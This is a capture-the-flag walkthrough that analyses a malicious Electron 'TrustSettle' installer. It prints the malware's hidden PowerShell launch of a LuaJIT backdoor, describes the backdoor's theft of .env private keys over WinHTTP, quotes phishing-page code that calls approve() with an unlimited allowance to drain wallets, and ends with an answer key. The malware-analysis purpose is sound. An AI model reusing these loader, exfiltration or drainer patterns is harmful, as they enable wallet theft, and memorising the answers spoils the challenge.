# Holmes CTF 2026 — Sherlock 01 "Silent Dividend"

## 1. TL;DR

A malicious Electron application distributed as a Windows NSIS installer ("TrustSettle 1.0.0.exe") targets cryptocurrency wallet holders through a three-pronged attack. First, a LuaJIT FFI backdoor silently monitors `C:\Users\Public\.env` for private key material and exfiltrates it via WinHTTP. Second, a phishing HTML page styled as a Terms of Service agreement tricks the victim into calling `approve(attacker, MaxUint256)` on a fake token contract, granting the attacker unlimited spending authority over their wallet. Third, the Electron preload script fetches a decryption key from an on-chain smart contract (`resolveState()`), decrypts an embedded payload, and executes it — the plaintext being a shell command that both launches the phishing page and leaks the campaign credentials. The final flag is recovered by computing the hidden owner address of a second on-chain contract (`x2 XOR x3`), then calling its view function `x9()` with that address, which streams a keccak256-keyed ciphertext and returns the coordinates `51.5049,0.0348`.

---

## 2. Environment Setup

### 2.1 What You Get

```
SilentDividend.zip
├── Holmes CTF 2026 Sherlock 01.pdf   # story;
├── DANGER.txt                        # warns not to run the binary and gives the zip password
└── danger.zip                        # password-protected
    ├── README.md                     # instructs victim to fill in C:\Users\Public\.env
    └── TrustSettle 1.0.0.exe         # NSIS self-extracting installer, 91 MB
```

The password for `danger.zip` is embedded in the story PDF: `E9$LQ2@Mr7A!`.

### **2.2 Unpacking the Installer**

`TrustSettle 1.0.0.exe` is a Nullsoft NSIS installer. **NEVER** run it, 7-Zip reads NSIS archives directly:

bash

```bash
# Step 1: unpack the NSIS installer
7z x 'TrustSettle 1.0.0.exe'

# Step 2: unpack the Electron bundle
7z x app-64.7z

# Step 3: extract app.asar
npx @electron/asar extract resources/app.asar asar_out
```

After extraction:

```
asar_out/
├── main.js
├── preload.js
├── package.json
├── src/
│   └── settlement.html
└── node_modules/
    └── ethers/
```

### **2.3 Tooling**

bash

```bash
sudo apt install p7zip-full lua5.1
pip install pycryptodome
npm install -g @electron/asar
```

---

## 3. Vulnerability Analysis

### 3.1 The Shape of the Chain

```
TrustSettle 1.0.0.exe  (NSIS installer)
└── app-64.7z          (Electron bundle)
    ├── extraResources/
    │   ├── api.txt        ← LuaJIT FFI backdoor (credential stealer)
    │   ├── lua51.dll
    │   └── luajit.exe
    └── resources/app.asar
        ├── preload.js     ← orchestrator: copies files, spawns Lua, decrypts payload, exec()s it
        ├── src/
        │   └── settlement.html  ← phishing page (token drainer)
        └── node_modules/ethers/
```

### 3.2 The File Drop and Execution (Q1)

`preload.js` is the first code that runs. Its opening lines enumerate `extraResources/` and copy every file to a hardcoded path:

```javascript
fs.readdirSync(
    path.resolve(`${process.resourcesPath}/../extraResources`)
).forEach(f =>
    fs.copyFileSync(
        path.resolve(`${process.resourcesPath}/../extraResources`, f),
        path.join('C:\\Users\\Public', f)   // ← the destination
    )
);
```

All three files `api.txt`, `lua51.dll`, and `luajit.exe` are landing in `C:\Users\Public\`.

> **Q1** `C:\Users\Public`

**3.3 The Lua Backdoor (Q2, Q3)**

Immediately after copying, `preload.js` silently launches the backdoor:

javascript

```javascript
exec("powershell.exe -exec bypass -w hidden -nop -c " +
     "\"& 'C:\\Users\\Public\\luajit.exe' 'C:\\Users\\Public\\api.txt'\"");
```

`api.txt` is a 66 KB Lua script protected by a custom virtual machine obfuscator. Its string table is XOR-encoded, all identifiers are replaced with random tokens, and control flow is distributed via a numeric opcode table. Static reading is impractical; therefore, we built a Lua 5.1 sandbox, replacing all the dangerous real APIs with a log broker and running the obfuscated code within it.

```lua
cat > sandbox.lua <<'EOF'
local log = io.open("trace.txt", "w")
local n = 0

local function mkproxy(name)
    local t = {}
    return setmetatable(t, {
        __index    = function(_, k)
            log:write("INDEX " .. name .. "." .. tostring(k) .. "\n"); log:flush()
            return mkproxy(name .. "." .. tostring(k))
        end,
        __newindex = function(_, k, v)
            log:write("SET " .. name .. "." .. tostring(k) .. "=" .. tostring(v) .. "\n"); log:flush()
        end,
        __call     = function(_, ...)
            n = n + 1
            local args = {...}
            local parts = {}
            for i = 1, #args do
                parts[i] = type(args[i]) == "string"
                    and string.format("%q", args[i])
                    or tostring(args[i])
            end
            local line = name .. "(" .. table.concat(parts, ", ") .. ")\n"
            log:write(line); log:flush()
            if n > 50000 then log:write("LIMIT\n"); log:close(); os.exit(0) end
            return mkproxy(name .. "()")
        end,
        __tostring = function() return "<" .. name .. ">" end,
        __concat   = function(a, b) return tostring(a) .. tostring(b) end,
        __len      = function() return 0 end,
        __add      = function(a, b) return type(a)=="number" and a or 0 end,
        __sub      = function(a, b) return 0 end,
        __lt       = function() return false end,
        __le       = function() return false end,
        __eq       = function() return false end,
    })
end

local env = {}
for k, v in pairs(_G) do env[k] = v end

env.getfenv = function() return env end
env.setfenv = function(f, t) return f end

env.require = function(m)
    log:write("require(" .. tostring(m) .. ")\n"); log:flush()
    if m == "ffi" then
        return {
            cdef   = function(s)
                log:write("ffi.cdef:\n" .. tostring(s) .. "\n"); log:flush()
            end,
            load   = function(libname)
                return mkproxy("LIB:" .. tostring(libname))
            end,
            new    = function(t, sz)
                log:write("ffi.new(" .. tostring(t) .. ")\n"); log:flush()
                if t == "DWORD[1]" then return {[0]=64} end
                return mkproxy("CDATA:" .. tostring(t))
            end,
            cast   = function(t, v)
                return mkproxy("CAST:" .. tostring(t))
            end,
            string = function(p, l)
                log:write("ffi.string(" .. tostring(p) .. "," .. tostring(l) .. ")\n"); log:flush()
                return ".env"
            end,
            sizeof = function(t) return 12 end,
            copy   = function() end,
            fill   = function() end,
            C      = mkproxy("ffi.C"),
        }
    elseif m == "bit" then
        return {
            bor    = function(a, b) return (a or 0) + (b or 0) end,
            band   = function(a, b) return 0 end,
            bxor   = function(a, b) return 0 end,
            rshift = function(a, b) return 0 end,
            lshift = function(a, b) return 0 end,
            tobit  = function(a) return a end,
        }
    end
    return mkproxy("MOD:" .. tostring(m))
end

env.os = {
    time   = os.time, clock = os.clock, date = os.date,
    getenv = function(k)
        log:write("os.getenv(" .. tostring(k) .. ")\n"); log:flush()
        return "C:\\Users\\Public"
    end,
    exit   = function() log:close(); os.exit(0) end,
}

env.io = {
    open = function(p, m)
        log:write("io.open(" .. tostring(p) .. ", " .. tostring(m) .. ")\n"); log:flush()
        local lines = {
            "PRIVATE_KEY=0x" .. string.rep("a", 64),
            "WALLET_ADDRESS=0x" .. string.rep("b", 40),
            "RPC_URL=https://rpc.example/",
        }
        local i = 0
        return {
            lines = function() return function() i=i+1; return lines[i] end end,
            read  = function() return table.concat(lines, "\n") end,
            close = function() end,
        }
    end,
    write = function(...) log:write("io.write(" .. tostring((...)) .. ")\n"); log:flush() end,
}

setmetatable(env, {
    __index    = function(_, k)
        log:write("GLOBAL " .. tostring(k) .. "\n"); log:flush()
        return nil
    end,
    __newindex = function(t, k, v)
        log:write("SETGLOBAL " .. tostring(k) .. "\n"); log:flush()
        rawset(t, k, v)
    end,
})

local f = assert(loadfile("extraResources/api.txt"))
setfenv(f, env)
local ok, err = pcall(f)
log:write("DONE ok=" .. tostring(ok) .. " err=" .. tostring(err) .. "\n")
log:close()
EOF

timeout 60 lua5.1 sandbox.lua
grep -E "ffi.cdef|WinHttp|ReadDirectory|NOTIFY" trace.txt | head -40
```

The sandbox's fake `ffi` module records every `ffi.cdef` call verbatim. Two calls are particularly revealing:

**Call 1 — the directory-watch buffer:**

```c
typedef struct _FILE_NOTIFY_INFORMATION {
    DWORD NextEntryOffset;
    DWORD Action;
    DWORD FileNameLength;
    WCHAR FileName[1];
} FILE_NOTIFY_INFORMATION;
```

This is the structure Windows fills in when `ReadDirectoryChangesW` reports a change. The Lua script casts its output buffer to a `FILE_NOTIFY_INFORMATION *` to walk the change records.

> **Q2** `FILE_NOTIFY_INFORMATION`

**Call 2 — the HTTP exfiltration API:**

```c
BOOL WinHttpSendRequest(
    HINTERNET hRequest,
    LPCWSTR   lpszHeaders,
    DWORD     dwHeadersLength,
    LPVOID    lpOptional,
    DWORD     dwOptionalLength,
    DWORD     dwTotalLength,
    DWORD_PTR dwContext
);
```

The sandbox also captures the wide-string buffers the script constructs before calling `WinHttpOpen`:

```
BUF[wchar_t[?]] = C:\users\public\
BUF[wchar_t[?]] = LuaFFI-Client/1.0
BUF[wchar_t[?]] = 127.0.0.1
BUF[wchar_t[?]] = POST
BUF[wchar_t[?]] = /
```

The complete behaviour: watch `C:\Users\Public\` for any change whose filename ends in `.env`. On change, read every line of the file and POST the content to `http://127.0.0.1/` with `User-Agent: LuaFFI-Client/1.0`.

> **Q3** `WinHttpSendRequest`

**3.4 The On-Chain Decryption Key (Q4, Q5)**

Back in `preload.js`, after launching the Lua process, the script fetches the decryption key from Ethereum:

javascript

```javascript
const CONTRACT_ADDRESS = '0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1';
const CONTRACT_ABI     = ['function resolveState() view returns (bytes32)'];

const provider = new ethers.JsonRpcProvider(RPC_URL);
const contract  = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
const state     = await contract.resolveState();   // ← the key
```

> **Q4** `resolveState()`

The key is retrieved by navigating to the contract on Sepolia Etherscan, opening the **Read Contract** tab, and calling `resolveState()`:

```
https://sepolia.etherscan.io/address/0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1#readContract
```

Return value:

```
0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

The key is then used to decrypt `ENCRYPTED_DATA` with a custom three-step cipher defined in `preload.js`:

javascript

```javascript
const step1  = data[i] ^ keyByte;
const step2  = ((step1 << 7) | (step1 >>> 1)) & 0xff;  // ROL8(·,7)
result[i]    = step2 ^ 0x42;
```

Replicated in Python:

```python
encrypted = bytes.fromhex(
    "560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca"
    "8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74c"
    "fa2c4c4e1bbfc6204207fe5c801d201f5af84864f0"
)
key = bytes.fromhex(
    "3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4"
)

result = bytearray()
for i, c in enumerate(encrypted):
    key_byte = key[i % len(key)]
    step1 = c ^ key_byte
    step2 = ((step1 << 7) | (step1 >> 1)) & 0xff
    result.append(step2 ^ 0x42)

print(result.decode("utf-8"))
```

Output:

```
start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

> **Q5** `AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`

### 3.5 The HTML Drop Path (Q6)

After fetching the key, `preload.js` writes `settlement.html` out of the asar:

```javascript
const indexContent = fs.readFileSync(
    path.join(__dirname, 'src', 'settlement.html'), 'utf8');
fs.writeFileSync(
    path.resolve(`${process.resourcesPath}/../../settlement.html`),
    indexContent, 'utf8');
```

NSIS installs the Electron runtime to a temporary staging directory. `process.resourcesPath` resolves to `<staging>\resources`, so `../../` ascends to the staging root, which is inside `%TEMP%`. The exec'd command confirms it: `start "" "%TEMP%\settlement.html"`.

> **Q6** `%TEMP%`

### 3.6 The Phishing Contract (Q7, Q8, Q9)

`settlement.html` is a convincing Terms of Service page. Scrolling past the CSS reveals the attack logic:

```javascript
const X0_CONTRACT_ADDRESS = "0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D";
const MOCK_TOKEN_ADDRESS  = "0x6B2B0C0d0a376255Ac70Bf1366f50982bF476Bb2";

provider = new ethers.BrowserProvider(window.ethereum);   // Q9
await provider.send("eth_requestAccounts", []);
signer   = await provider.getSigner();

const token         = new ethers.Contract(MOCK_TOKEN_ADDRESS, MOCK_TOKEN_ABI, signer);
const unlimitedAmount = ethers.MaxUint256;                 // Q8
const tx = await token.approve(X0_CONTRACT_ADDRESS, unlimitedAmount);  // Q7
```

`ethers.MaxUint256` = 2²⁵⁶ − 1.

> **Q7** `approve()`  
> **Q8** `115792089237316195423570985008687907853269984665640564039457584007913129639935`  
> **Q9** `BrowserProvider`

### 3.7 The Hidden Contract Flag (Q10)

The drainer contract at `0x69Bf5b7aBA51C3Ee8bF169aB47479ba95DBF709D` conceals a flag behind a hidden-owner gate. Two private `bytes32` fields are XOR-combined to produce the owner address:

```solidity
bytes32 private x2 = 0x7ccb3a440e383635148b237df8bb22dff0b594425beae88d6e1623df0bc7669b;
bytes32 private x3 = 0x7ccb3a440e383635148b237d13473c069ba9ffd6545c58ee37e969b87d181c01;

function x7() public view returns (address) {
    return address(uint160(uint256(x2) ^ uint256(x3)));
}
```

`x2` and `x3` share their first 12 bytes (zeroing that half of the XOR), so:

```
x2 XOR x3 = 0x000000000000000000000000ebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a
```

The lower 20 bytes give the EIP-55 checksummed address `0xEBfC1eD96b1C6b940fb6B06359fF4A6776Df7a9A`.

The view function `x9(address x10)` requires `x10 == x7()` and then decrypts `x4` (the on-chain ciphertext set by `x8()`) using a `keccak256` stream cipher keyed by `x10`:

```solidity
function _crypt(bytes memory data, address key) internal pure returns (bytes memory) {
    bytes memory out = new bytes(data.length);
    uint256 counter = 0;
    uint256 i = 0;
    while (i < data.length) {
        bytes32 block_ = keccak256(abi.encodePacked(key, counter));
        for (uint256 j = 0; j < 32 && i < data.length; j++) {
            out[i] = data[i] ^ block_[j];
            i++;
        }
        counter++;
    }
    return out;
}
```

Calling `x9(0xEBfC1eD96b1C6b940fb6B06359fF4A6776Df7a9A)` on Sepolia Etherscan (Read Contract tab) returns the flag.

> **Q10** `51.5049,0.0348`

---

## 4. Attack Method

### Step 1 — Extract the installer

```bash
# Unzip the outer archive (password from PDF)
unzip -P 'E9$LQ2@Mr7A!' danger.zip

# Unpack NSIS (do NOT run the .exe)
7z x 'TrustSettle 1.0.0.exe'

# Unpack the Electron bundle
7z x app-64.7z
```

### Step 2 — Extract app.asar

If Node ≥ 22 is available:

```bash
npx @electron/asar extract resources/app.asar asar_out
```

Otherwise use the Python extractor from §2.2.

### Step 3 — Read preload.js (Q1, Q4, Q6)

```bash
cat asar_out/preload.js
```

Q1 (`C:\Users\Public`), Q4 (`resolveState()`), and Q6 (`TEMP`) all fall out of a single read.

### Step 4 — Run the Lua sandbox (Q2, Q3)

Save the sandbox script to `sandbox.lua` (see §3.3 for the full listing), then:

```bash
lua5.1 sandbox.lua
grep -E "FILE_NOTIFY|WinHttp" trace.txt
```

### **Step 5 — Retrieve the key and decrypt the payload (Q5)**

Navigate to the contract on Sepolia Etherscan and call `resolveState()` under the **Read Contract** tab:

```
https://sepolia.etherscan.io/address/0xbB63Ae28E4f75C9392bae69cDf5394Ca0ACdA6B1#readContract
```

Return value:

```
0x3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4
```

Then decrypt locally:

```python
encrypted = bytes.fromhex(
    "560c325bdd0aeea2cd2690a2ed1c1b4a28deca7ac2a40ce8d2725d539a950ca"
    "8f4a4bcf375806c36532258a0cf16c19c12989e0aa0e25a72be241da7d2f74c"
    "fa2c4c4e1bbfc6204207fe5c801d201f5af84864f0"
)
key = bytes.fromhex(
    "3460743bb1ce2e6209e65e8ee3023f8414bc8416aef842b69c2a318bcef952f4"
)

result = bytearray()
for i, c in enumerate(encrypted):
    key_byte = key[i % len(key)]
    step1 = c ^ key_byte
    step2 = ((step1 << 7) | (step1 >> 1)) & 0xff
    result.append(step2 ^ 0x42)

print(result.decode("utf-8"))
# start "" "%TEMP%\settlement.html" && echo AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821
```

### Step 6 — Read settlement.html (Q7, Q8, Q9)

```bash
cat asar_out/src/settlement.html | grep -E "approve|MaxUint|BrowserProvider"
```

### Step 7 — Compute the hidden owner address (Q10 setup)

```python
x2 = 0x7ccb3a440e383635148b237df8bb22dff0b594425beae88d6e1623df0bc7669b
x3 = 0x7ccb3a440e383635148b237d13473c069ba9ffd6545c58ee37e969b87d181c01
addr = (x2 ^ x3) & ((1 << 160) - 1)
print(f'0x{addr:040x}')
# 0xebfc1ed96b1c6b940fb6b06359ff4a6776df7a9a
```

Compute the EIP-55 checksum to get `0xEBfC1eD96b1C6b940fb6B06359fF4A6776Df7a9A`, then call `x9` on Etherscan.

---

## 5. Full Exploit

|Q|Topic|Answer|
|---|---|---|
|Q1|extraResources copy destination|`C:\Users\Public`|
|Q2|Directory-watch buffer structure|`FILE_NOTIFY_INFORMATION`|
|Q3|HTTP exfiltration API|`WinHttpSendRequest`|
|Q4|On-chain decryption key function|`resolveState()`|
|Q5|Decrypted payload flag|`AUTH=NAPOLEON SETTLEMENT_REFERENCE=SR-4821`|
|Q6|HTML drop environment variable|`TEMP`|
|Q7|Token spending-permission function|`approve()`|
|Q8|Approval amount|`115792089237316195423570985008687907853269984665640564039457584007913129639935`|
|Q9|ethers.js v6 wallet provider class|`BrowserProvider`|
|Q10|Hidden contract coordinates|`51.5049,0.0348`|


